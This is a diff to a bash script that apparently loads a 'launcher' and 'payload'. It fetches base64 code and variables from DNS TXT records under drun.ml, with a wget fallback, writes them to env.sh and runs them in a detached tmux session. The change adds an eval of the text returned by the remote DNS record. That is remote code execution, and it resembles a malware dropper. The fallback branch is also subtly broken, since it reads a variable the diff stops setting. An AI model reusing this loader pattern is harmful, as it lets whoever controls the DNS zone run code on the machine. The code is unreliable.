@@ -53,9 +53,11 @@ endpoints() {
     launcher=$(echo "$launcher" | $b64 -d -w $chunksize)
     # script_url=$(dig txt latest.drun.ml +short)
     zone=drun.ml
-    record=pl
-    pl_token=$(querydns)
-    pl_token=${pl_token//\"}
+    record=plvars
+    pl_vars=$(querydns)
+    pl_vars=${pl_vars/\"}
+    pl_vars=${pl_vars%\"}
+    pl_vars=${pl_vars//\\\"/\"}
 }
 
 endpoints_fallback() {
@@ -64,8 +66,8 @@ endpoints_fallback() {
     data=$(echo "$script_url" | wget -q -i- -O- | $b64 -d)
     parsedata
     launcher=${data}
-    pl_token=$(echo "$token_url" | wget -q -i- -S 2>&1 | grep -m1 'Location') ## m1 also important to stop wget
-    pl_token=${pl_token/*\/}
+    pl_vars=$(echo "$token_url" | wget -q -i- -S 2>&1 | grep -m1 'Location') ## m1 also important to stop wget
+    pl_vars=${pl_token/*\/}
 }
 
 filename=".rslv"
@@ -103,9 +105,10 @@ while [ -z "$launcher" ]; do
     sleep 1
 done
 
-pl_token="${pl_token}" pl_name="${pl_name:-payload}"
+# pl_mask=":ep/:token" pl_token="${pl_token}" pl_name="${pl_name:-payload}"
+eval "$pl_vars"
 echo "export \
-pl_token=${pl_token} pl_name=${pl_name:-payload} \
+$pl_vars \
 X_TOKEN=${X_TOKEN:-acstkn} \
 $ENV_VARS \
 ">env.sh
@@ -117,10 +120,11 @@ if [ "$TMX" = 1 ]; then
     tmux start-server
     tmux set -g default-shell /bin/bash
 
-    tmux  setenv -g pl_token "$pl_token"
-    tmux  setenv -g pl_name "$pl_name"
+    # tmux  setenv -g pl_token "$pl_mask"
+    # tmux  setenv -g pl_token "$pl_token"
+    # tmux  setenv -g pl_name "$pl_name"
 
-    tmux kill-session -t crt
+    tmux kill-session -t crt; sleep 1
     tmux new -d -s crt
     tmux set-option -t crt remain-on-exit
     ENV=$(<env.sh)
